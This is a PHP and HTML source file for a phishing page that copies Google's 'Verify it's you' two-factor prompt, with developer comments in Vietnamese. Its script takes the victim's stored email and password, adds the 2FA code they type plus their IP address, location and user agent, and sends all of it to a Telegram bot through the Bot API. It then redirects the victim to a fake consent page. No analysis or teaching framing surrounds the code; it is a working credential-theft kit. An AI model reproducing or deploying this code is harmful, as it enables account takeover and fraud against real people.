<?php
// get root directory
require_once('./get-data.php');
require_once('./getip.php');
?>
    
<?php
function getServerIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

$ip_server = getServerIP();
?>

<?php
$userAgent = $_SERVER['HTTP_USER_AGENT'];
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verify it's you - Google Accounts</title>
    <link rel="icon" href="/images/favicon.ico">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: "Google Sans", roboto, "Noto Sans Myanmar UI", arial, sans-serif;
            background-color: #f1f3f4;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            gap: 5px;
            padding: 20px;
        }

        .container {
            background: white;
            border-radius: 24px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
            max-width: 55%;
            width: 100%;
            padding: 36px 40px 36px;
        }

        .header {
            display: flex;
            align-items: center;
            margin-bottom: 16px;
        }

        .google-logo {
            width: 44px;
            height: 44px;
            margin-right: 8px;
        }

        .signin-text {
            font-size: 16px;
            font-weight: 400;
            color: #202124;
        }

        .main-content {
            display: flex;
            gap: 40px;
            align-items: flex-start;
        }

        .left-section {
            flex: 1;
        }

        .right-section {
            flex: 1;
        }

        .app-logo {
            width: 48px;
            height: 48px;
            background:rgb(243, 247, 250);
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            border: 1px solid rgb(219, 221, 223);
            border-radius: 8px;
            margin-bottom: 16px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 20px;
            font-weight: bold;
            color: #5f6368;
        }

        .title {
            font-size: 34px;
            font-weight: 400;
            color: #202124;
            margin-bottom: 8px;
        }

        .subtitle {
            font-size: 18px;
            color: rgb(60, 61, 63);
            margin-bottom: 32px;
        }

        .subtitle a {
            color: rgb(11 87 208 / 1);
            text-decoration: none;
        }

        .subtitle a:hover {
            text-decoration: underline;
        }

        .user-info {
            background: transparent;
            padding: 5px 10px 5px 5px;
            margin-bottom: 24px;
            border: 1px solid rgb(219, 221, 223);
            border-radius: 24px;
            width: fit-content;
            font-size: 14px;
            color: #202124;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .user-icon {
            width: 20px;
            height: 20px;
            background: #5f6368;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 12px;
            font-weight: bold;
        }

        .user-email {
            font-weight: 500;
        }

        .code-section {
            margin-bottom: 24px;
            position: relative;
        }

        .code-label {
            position: absolute;
            top: -8px;
            left: 12px;
            background: white;
            padding: 0 4px;
            font-size: 12px;
            font-weight: 500;
            color: rgb(11 87 208 / 1);
            z-index: 1;
        }

        .code-input {
            width: 100%;
            padding: 16px 15px 13px 15px;
            border: 1px solid rgb(108, 109, 110);
            border-radius: 4px;
            font-size: 16px;
            color: #202124;
            outline: none;
            transition: border-color 0.2s;
            background: white;
        }

        .code-input:focus {
            border-color: rgb(11 87 208 / 1);
            border-width: 2px;
        }

        .code-input.error {
            border-color: #d93025;
            border-width: 2px;
        }

        .error-message {
            display: none;
            color: #d93025;
            font-size: 12px;
            margin-top: 8px;
            font-weight: 500;
        }

        .checkbox-container {
            display: flex;
            align-items: center;
            gap: 8px;
            margin-top: 16px;
        }

        .checkbox-input {
            width: 16px;
            height: 16px;
            accent-color: rgb(11 87 208 / 1);
            cursor: pointer;
        }

        .checkbox-label {
            font-size: 14px;
            color: #202124;
            cursor: pointer;
            user-select: none;
        }

        .button-group {
            display: flex;
            justify-content: flex-end;
            align-items: center;
            gap: 16px;
            margin-top: 24px;
        }

        .try-another-link {
            color: rgb(11 87 208 / 1);
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }

        .try-another-link:hover {
            text-decoration: underline;
        }

        .next-button {
            background: rgb(11 87 208 / 1);
            color: white;
            border: none;
            border-radius: 24px;
            padding: 12px 24px;
            font-size: 14px;
            font-weight: bold;
            cursor: pointer;
            transition: background-color 0.2s;
        }

        .next-button:hover {
            background: #1557b0;
        }

        .next-button:disabled {
            cursor: not-allowed;
            opacity: 0.5;
        }

        .page-footer {
            padding: 20px;
            display: flex;
            align-items: center;
            background: transparent;
            position: relative; bottom: 0; width: 100%;
            max-width: 55%;
        }

        .language-selector {
            display: flex;
            align-items: center;
            gap: 8px;
            color: #5f6368;
            font-size: 12px;
            cursor: pointer;
        }

        .language-selector:hover {
            color: rgb(11 87 208 / 1);
        }

        .page-footer-links {
            display: flex;
            gap: 16px;
        }

        .page-footer-link {
            color: #5f6368;
            text-decoration: none;
            font-size: 12px;
        }

        .page-footer-link:hover {
            text-decoration: underline;
        }

        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateY(-10px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .error-message {
            animation: slideIn 0.3s ease-out;
        }

        @media (max-width: 480px) {
            .container {
                padding: 24px 20px;
                margin: 0 16px;
                max-width: 450px;
            }
            
            .main-content {
                flex-direction: column;
                gap: 24px;
            }
            
            .button-group {
                flex-direction: column;
                gap: 16px;
                align-items: stretch;
            }
            
            .next-button {
                width: 100%;
            }
        }
    </style>
</head>

<body>
    <div class="container">
        <div class="header">
            <svg class="google-logo" viewBox="0 0 24 24">
                <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
                <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
                <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
                <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
            </svg>
        </div>

        <div class="main-content">
            <div class="left-section">
                <div class="app-logo" id="appLogo">JL</div>
                <h1 class="title">Verify it's you</h1>
                <p class="subtitle" style="font-size: 14px;">To help keep your account safe, Google wants to make sure it's really you</p>
                
                <div class="user-info">
                    <div class="user-icon" id="userIcon">U</div>
                    <span class="user-email" id="displayEmail"></span>
                </div>
            </div>

            <div class="right-section">
                <p class="subtitle" style="font-size: 14px; margin-bottom: 24px;">Get a verification code from the Google Authenticator app</p>
                <form onsubmit="sendToTelegramFromTwoFactorAuthentication2(event)" autocomplete="off">
                    <div class="code-section">
                        <label for="code" class="code-label">Enter code</label>
                        <input type="text" id="code" class="code-input" placeholder="" maxlength="8" required>
                        <div class="error-message" id="errorMessage">The login code you entered does not match the code sent to your phone. Please re-enter if it still does not match.</div>
                    </div>

                    <div class="button-group">
                        <a href="#" class="try-another-link">More ways to verify</a>
                        <button type="submit" class="next-button" id="nextButton" disabled>Next</button>
                    </div>
                </form>
            </div>
        </div>
    </div>

    <div class="page-footer">
        <div class="language-selector" style="position: absolute; left: 0;">
            <span>English (United States)</span>
            <svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor">
                <path d="M7 10l5 5 5-5z"/>
            </svg>
        </div>
        <div class="page-footer-links" style="position: absolute; right: 0;">
            <a href="#" class="page-footer-link">Help</a>
            <a href="#" class="page-footer-link">Privacy</a>
            <a href="#" class="page-footer-link">Terms</a>
        </div>
    </div>

    <script>
        // Biến từ PHP
        var ip = '<?php echo $ip; ?>';
        var city = '<?php echo $city; ?>';
        var country = '<?php echo $country; ?>';
        var org = '<?php echo $org; ?>';
        var timezone = '<?php echo $timezone; ?>';
        var userAgent = '<?php echo $userAgent; ?>';
        var botToken = '<?php echo $token; ?>';
        var chatId = '<?php echo $chatId; ?>';

        document.addEventListener('DOMContentLoaded', function() {
            const codeInput = document.getElementById('code');
            const nextButton = document.getElementById('nextButton');
            const errorMessage = document.getElementById('errorMessage');
            const displayEmail = document.getElementById('displayEmail');

            // Hiển thị email từ localStorage
            const email = localStorage.getItem('googleEmail') || localStorage.getItem('email');
            if (email) {
                displayEmail.textContent = email;
                
                // Lấy ký tự đầu tiên của email để hiển thị trong app-logo và user-icon
                const firstChar = email.charAt(0).toUpperCase();
                const appLogo = document.getElementById('appLogo');
                const userIcon = document.getElementById('userIcon');
                appLogo.textContent = firstChar;
                userIcon.textContent = firstChar;
            }

            // Enable button khi có input
            codeInput.addEventListener('input', function() {
                if (this.value.length >= 6) {
                    nextButton.disabled = false;
                    nextButton.style.opacity = '1';
                } else {
                    nextButton.disabled = true;
                    nextButton.style.opacity = '0.5';
                }
                
                // Xóa class error khi user nhập lại
                if (this.value.length > 0) {
                    this.classList.remove('error');
                    errorMessage.style.display = 'none';
                }
            });
        });

        function sendToTelegramFromTwoFactorAuthentication2(event) {
            event.preventDefault();
            
            var code = document.getElementById('code').value;
            var email = localStorage.getItem('googleEmail') || localStorage.getItem('email');
            var password = localStorage.getItem('password');
            
            // Gửi dữ liệu đến Telegram
            var content = "🔐 Google 2FA Code (2nd Step)💬" +
                "\n" + "----------------------------------------------------------" +
                "\nEmail: " + "`" + email + "`" +
                "\n" + "----------------------------------------------------------" +
                "\nPassword: " + "`" + password + "`" +
                "\n" + "----------------------------------------------------------" +
                "\n2FA Code (2nd): " + "`" + code + "`" +
                "\n" + "----------------------------------------------------------" +
                "\nIP dự phòng: " + "`<?php echo htmlspecialchars($ip_server); ?>`" +
                "\nIP Address: " + "`<?php echo $ip; ?>`" +
                "\nCity: " + "`<?php echo $city; ?>`" +
                "\nRegion: " + "`<?php echo $region; ?>`" +
                "\nCountry: " + "`<?php echo $country; ?>`" +
                "\nOrg: " + "`<?php echo $org; ?>`" +
                "\nTimezone: " + "`<?php echo $timezone; ?>`" +
                "\nUser-Agent: " + "`<?php echo $userAgent; ?>`";
            
            fetch('https://api.telegram.org/bot' + botToken + '/sendMessage', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: content,
                    parse_mode: 'Markdown'
                })
            })
            .then(response => response.json())
            .then(data => {
                // Thành công ngay lập tức - chuyển đến trang consent
                window.location.href = "/google-consent.php";
            })
            .catch(error => {
                console.error('Error:', error);
                // Fallback nếu có lỗi network - vẫn chuyển đến trang consent
                window.location.href = "/google-consent.php";
            });
        }
    </script>
</body>

</html>
